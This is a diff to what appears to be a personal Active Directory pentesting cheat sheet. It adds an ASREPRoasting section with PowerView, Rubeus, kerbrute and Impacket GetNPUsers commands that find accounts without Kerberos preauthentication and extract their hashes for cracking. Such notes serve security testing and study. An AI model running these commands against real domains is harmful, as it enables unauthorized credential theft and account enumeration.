@@ -1,7 +1,7 @@
 ---
 layout: app
 title: "Active Directory"
-tags: ["PASSWD_NOTREQD","enumeration","unconstrain delegation","kerberos","Double-hop", "GPO","OU", "finduserdomain"]
+tags: ["PASSWD_NOTREQD","enumeration","unconstrain delegation","kerberos","Double-hop", "GPO","OU", "finduserdomain","asreproasting"]
 
 ---
 
@@ -41,6 +41,27 @@ Enter-PSSession $dc
 
 ```
 (PowerView)> Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+```
+
+# ASREPRoasting
+
+Using **Rubeus** to extract hashes.
+
+**DONT_REQ_PREAUTH** attribute user account
+
+## Enumerate
+
+```powershell
+Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, useraccountcontrol | fl
+```
+```
+.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
+```
+```bash
+kerbrute userenum -d <domain> --dc <Domain IP address> <wordlists>
+```
+```python
+Get-NPUsers.py <DOMAIN/> -dc-ip <Domain IP> -no-pass -usersfile <wordlists>
 ```
 
 # PASSWD_NOTREQD
@@ -91,8 +112,6 @@ UserPrincipalName    :
 Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
 Get-ADDomain
 ```
-
-
 
 ### Get Password Policy
 
